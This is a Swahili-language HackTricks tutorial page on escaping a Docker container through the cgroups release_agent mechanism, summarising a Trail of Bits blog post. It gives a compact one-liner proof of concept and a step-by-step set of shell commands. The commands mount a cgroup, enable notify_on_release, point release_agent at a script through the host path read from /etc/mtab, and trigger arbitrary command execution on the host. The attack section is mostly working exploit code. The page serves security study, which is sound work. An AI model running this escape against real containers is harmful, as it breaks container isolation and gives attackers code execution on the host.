# Kutoroka kwa cgroups ya Docker release_agent

<details>

<summary><strong>Jifunze AWS kutoroka kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wame **vamiwa** na **malware za wizi**.

Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za kuiba taarifa.

Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** kwa:

{% embed url="https://whiteintel.io" %}

***

**Kwa maelezo zaidi, tazama** [**chapisho la blogi la asili**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Hii ni muhtasari tu:

Poc ya Asili:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
### Uthibitisho wa Mfano (PoC)

Uthibitisho wa mfano (PoC) unaonyesha njia ya kutumia cgroups kwa kujenga faili ya `release_agent` na kuzindua wito wake ili kutekeleza amri za kupindukia kwenye mwenyeji wa kontena. Hapa kuna maelezo ya hatua zinazohusika:

1. **Andaa Mazingira:**
   - Dhibiti `/tmp/cgrp` inayoundwa kutumika kama kituo cha mlima kwa cgroup.
   - Msimamizi wa cgroup wa RDMA unamiminiwa kwenye saraka hii. Katika kesi ya kutokuwepo kwa msimamizi wa RDMA, inashauriwa kutumia msimamizi wa cgroup wa `memory` kama mbadala.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Wekeza Kikundi cha Mtoto:**
* Kikundi cha mtoto kinachoitwa "x" kimeundwa ndani ya saraka ya kikundi iliyofungwa.
* Taarifa zimeanzishwa kwa kikundi cha "x" kwa kuandika 1 kwenye faili yake ya notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Sanidi Msimamizi wa Kutolewa:**
* Njia ya chombo kwenye mwenyeji inapatikana kutoka kwa faili ya /etc/mtab.
* Faili ya release\_agent ya cgroup kisha inasanidiwa kutekeleza script iliyoitwa /cmd iliyoko kwenye njia ya mwenyeji iliyopatikana.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Unda na Sanidi Skripti ya /cmd:**
* Skripti ya /cmd inaundwa ndani ya chombo na kusanidiwa kutekeleza ps aux, ikielekeza matokeo kwenye faili iliyoitwa /output kwenye chombo. Njia kamili ya /output kwenye mwenyeji inatajwa.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Kuzindua Shambulizi:**
* Mchakato unaanzishwa ndani ya cgroup ya mtoto "x" na mara moja unakomeshwa.
* Hii inazindua `release_agent` (script ya /cmd), ambayo inatekeleza ps aux kwenye mwenyeji na kuandika matokeo kwa /output ndani ya kontena.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malware za kuiba**.

Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za kuiba taarifa.

Unaweza kutembelea tovuti yao na kujaribu injini yao kwa **bure** kwenye:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
